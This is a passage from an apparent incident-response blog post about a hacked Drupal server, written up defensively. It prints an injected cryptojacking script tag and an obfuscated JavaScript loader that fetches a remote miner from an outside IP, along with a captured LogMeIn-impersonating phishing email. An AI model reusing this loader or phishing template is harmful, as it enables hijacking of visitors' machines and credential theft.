+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;//drupalupdates.tk/check.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;?php^M
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This looks suspicious, so we researched this piece of code (i.e., googled it), and found out that these were cryptomining scripts, as reported by this: &lt;a class=&#34;link&#34; href=&#34;https://twitter.com/bad_packets/status/1037416308336287744&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://twitter.com/bad_packets/status/1037416308336287744&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;To remediate this issue, we simply removed these scripts. However, the connections still persisted:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:/var/www/subdomain$ netstat -an
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Active Internet connections (servers and established)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:42191   98.137.157.43:25        TIME_WAIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:47567   192.64.147.176:25       SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:48204   23.20.239.12:25         SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:46017   67.195.228.87:25        TIME_WAIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:48211   23.20.239.12:25         SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:50025   98.136.101.116:25       TIME_WAIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:49812   52.162.126.195:25       SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:36409   185.53.178.8:25         SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:48231   23.20.239.12:25         SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:43103   207.148.248.145:25      SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:58587   162.255.119.180:25      SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0    168 10.10.10.10:22      10.10.10.12:38580   ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:42186   98.137.157.43:25        TIME_WAIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:45291   68.178.213.61:25        SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:37805   204.188.217.106:80      ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0   2205 10.10.10.10:34654   216.120.254.206:25      ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:39909   184.168.131.241:25      SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:48962   184.168.47.225:25       SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:38409   98.136.96.73:25         TIME_WAIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:55883   216.251.100.19:25       ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:32777   204.188.217.106:80      ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:33846   159.8.40.50:25          SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:47992   198.185.159.145:25      SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      1 10.10.10.10:39920   184.168.131.241:25      SYN_SENT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:37092   66.218.85.151:25        TIME_WAIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::80                   :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::22                   :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::25                   :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::443                  :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 10.10.10.10:123     0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 127.0.0.1:123           0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now there is even a SMTP port open (port &lt;strong&gt;25&lt;/strong&gt;). We sniff some packets on the SMTP port:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;user@host:/var/www/subdomain$ sudo tshark &amp;#34;port 25&amp;#34;
+Running as user &amp;#34;root&amp;#34; and group &amp;#34;root&amp;#34;. This could be dangerous.
+tshark: Lua: Error during loading:
+ /usr/share/wireshark/init.lua:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
+Capturing on &amp;#39;eth0&amp;#39;
+155 187.354503622  74.6.137.68 → 10.10.10.10 SMTP 171 S: 250 sender &amp;lt;www-data@www.website.ca&amp;gt; ok | 250 recipient &amp;lt;atheneos@atheneoscafe.com&amp;gt; ok | 354 go ahead
+156 187.354596107 10.10.10.10 → 74.6.137.68  SMTP 1514 C: DATA fragment, 1448 bytes
+157 187.354605929 10.10.10.10 → 74.6.137.68  SMTP|IMF 853 subject: =?UTF-8?B?TG9nTWVJbiBOb3RpZmljYXRpb24gLSBDb21wdXRlciBJRDogMjg1MzI4NTczNSBkZWxldGVk?=, from: =?UTF
+-8?B?TG9nTWVJbi5jb20=?= &amp;lt;noreplay@logmein.com&amp;gt;, ,   , &amp;lt;p&amp;gt;Event: Computer deleted&amp;lt;/p&amp;gt;  , &amp;lt;p&amp;gt;If this is an error, use the link bellow to restore your computer back.&amp;lt;/p&amp;gt;
+, &amp;lt;p&amp;gt;&amp;lt;a rel=&amp;#34;nofollow noopener&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://restore.logmein.click/pc/?e=bmV0LmFzc2FzeW5AeWFob28uY29t&amp;#34; style=&amp;#34;outline: none; color: #00aeef; font-weight:
+bold; text-decoration: none;&amp;#34;&amp;gt;http://restore.logmein.com/login.aspx?clusterid=YXRoZW5lb3NAYXRoZW5lb3NjYWZlLmNvbQ==&amp;lt;/a&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;br /&amp;gt; Account holder: atheneos@atheneoscafe.com
+&amp;lt;br /&amp;gt; Computer ID: 5714726389 &amp;lt;br /&amp;gt; At: 21.12.2018 13:03:20&amp;lt;br /&amp;gt; From: 127.0.0.1 (localhost)&amp;lt;br /&amp;gt; &amp;lt;br /&amp;gt; LogMeIn Account Holders can change notification settings
+by clicking their LogMeIn ID in the upper-right corner of LogMeIn Central and then Account &amp;amp;gt; Security &amp;amp;gt; Account Audit.&amp;lt;/p&amp;gt;  , &amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;  , &amp;lt;p&amp;gt;&amp;lt;span style=&amp;#34;color: #333333;
+font-family: arial, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space:
+normal; widows: 2; word-spacing: 0px; background-color: #ffffff; text-decoration-color: initial; display: inline !important; float: none;&amp;#34;&amp;gt;Copyright &amp;amp;copy; 2003-2018 LogMeIn,
+Inc.&amp;lt;/span&amp;gt;&amp;lt;a rel=&amp;#34;nofollow noopener&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://secure.logmein.com/policies/trademark.aspx&amp;#34; style=&amp;#34;margin: 0px; padding: 0px; border: 0px; font-style: normal;
+font-weight: 400; font-stretch: inherit; font-size: 11px; line-height: inherit; font-family: arial, sans-serif; vertical-align: baseline; outline: 0px; color: #0088ce;
+text-decoration: none; cursor: pointer; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;
+background-color: #ffffff;&amp;#34;&amp;gt;All rights reserved.&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;  ,   ,   ,
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, this looks more like phishing activity. Therefore this was an independent attack from the previous cryptojacking attack. This explains why removing the scripts did not close the connections.&lt;/p&gt;
+&lt;h2 id=&#34;phishing-attack&#34;&gt;Phishing Attack
+&lt;/h2&gt;&lt;p&gt;We realize there are potentially 2 (common) ways to attacking this server: either through the &lt;strong&gt;ssh&lt;/strong&gt; open port &lt;strong&gt;22&lt;/strong&gt; or through the web application (hosted on port &lt;strong&gt;80&lt;/strong&gt;). Since, we saw a lot of activity with the web-server, we thought of visiting the domain of the website and checking for suspicious elements on the background.&lt;/p&gt;
+&lt;p&gt;Upon visiting the subdomain site’s main page &lt;a class=&#34;link&#34; href=&#34;https://subdomain.website.ca&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://subdomain.website.ca&lt;/a&gt;, when inspecting the elements on the HTML page of the site, we found a hidden javascript tag code that has a suspicious link.&lt;/p&gt;
+&lt;p&gt;[&lt;!-- raw HTML omitted --&gt;]({{ site.baseurl }}/)&lt;/p&gt;
+&lt;p&gt;Just like any (in)sane person would do, we downloaded the file and take a look:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:$  wget http://wt-23...full-http-control
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:$ cat full-http-control
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var _0x17e1=[&amp;#34;script&amp;#34;,&amp;#34;createElement&amp;#34;,&amp;#34;type&amp;#34;,&amp;#34;text/javascript&amp;#34;,&amp;#34;readyState&amp;#34;,&amp;#34;onreadystatechange&amp;#34;,&amp;#34;loaded&amp;#34;,&amp;#34;complete&amp;#34;,&amp;#34;onload&amp;#34;,&amp;#34;src&amp;#34;,&amp;#34;appendChild&amp;#34;,&amp;#34;head&amp;#34;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;getElementsByTagName&amp;#34;,&amp;#34;http://146.185.234.113/hhY6.js&amp;#34;,&amp;#34;undefined&amp;#34;,&amp;#34;stop&amp;#34;,&amp;#34;_client&amp;#34;,&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;,&amp;#34;start&amp;#34;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;function loadScript(_0x17a8x2,_0x17a8x3){var _0x17a8x4=document[_0x17e1[1]](_0x17e1[0]);_0x17a8x4[_0x17e1[2]]= _0x17e1[3];if(_0x17a8x4[_0x17e1[4]])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{_0x17a8x4[_0x17e1[5]]= function(){if(_0x17a8x4[_0x17e1[4]]== _0x17e1[6]|| _0x17a8x4[_0x17e1[4]]== _0x17e1[7]){_0x17a8x4[_0x17e1[5]]= null;_0x17a8x3()}}}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!=
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]=  new
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A cleaner version would be:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var _0x17e1=
+[&amp;#34;script&amp;#34;,
+&amp;#34;createElement&amp;#34;,
+&amp;#34;Type&amp;#34;,
+&amp;#34;text/javascript&amp;#34;,
+&amp;#34;readyState&amp;#34;,
+&amp;#34;Onreadystatechange&amp;#34;,
+&amp;#34;Loaded&amp;#34;,
+&amp;#34;Complete&amp;#34;,
+&amp;#34;Onload&amp;#34;,
+&amp;#34;Src&amp;#34;,
+&amp;#34;appendChild&amp;#34;,
+&amp;#34;Head&amp;#34;,
+&amp;#34;getElementsByTagName&amp;#34;,
+&amp;#34;http://146.185.234.113/hhY6.js&amp;#34;,
+&amp;#34;Undefined&amp;#34;,
+&amp;#34;Stop&amp;#34;,
+&amp;#34;_client&amp;#34;,
+&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;,
+&amp;#34;Start&amp;#34;];
+function loadScript(_0x17a8x2,_0x17a8x3){
+  var _0x17a8x4 = document[_0x17e1[1]](_0x17e1[0]);
+  _0x17a8x4[_0x17e1[2]] = _0x17e1[3];
+if(_0x17a8x4[_0x17e1[4]]){
+  _0x17a8x4[_0x17e1[5]] = function(){
+    if(_0x17a8x4[_0x17e1[4]] == _0x17e1[6] || _0x17a8x4[_0x17e1[4]] == _0x17e1[7]){
+      _0x17a8x4[_0x17e1[5]] = null;_0x17a8x3()}}}else {_0x17a8x4[_0x17e1[8]]= function(){_0x17a8x3()}};_0x17a8x4[_0x17e1[9]]= _0x17a8x2;document[_0x17e1[12]](_0x17e1[11])[0][_0x17e1[10]](_0x17a8x4)}loadScript(_0x17e1[13],function(){setTimeout(function(){if( typeof (miner)!= _0x17e1[14]){try{miner[_0x17e1[15]]()}catch(e){}};if( typeof (_client)!= _0x17e1[14]){try{_client[_0x17e1[15]]()}catch(e){}};document[_0x17e1[16]]=  new Client.Anonymous(_0x17e1[17],{throttle:0.3});document[_0x17e1[16]][_0x17e1[18]](Client.FORCE_MULTI_TAB)},1000)})
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, this link fetches some malicious script to load hhY6.js. We tried to translate the loadScript functions.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;script&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;createElement&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;readyState&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreadystatechange&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loaded&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;complete&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onload&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;src&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;appendChild&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;head&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getElementsByTagName&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://146.185.234.113/hhY6.js&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;undefined&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stop&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_client&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x17e1&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;loadScript&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x2&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x3&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;createElement&amp;#34;&lt;/span&gt;](&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;script&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;;
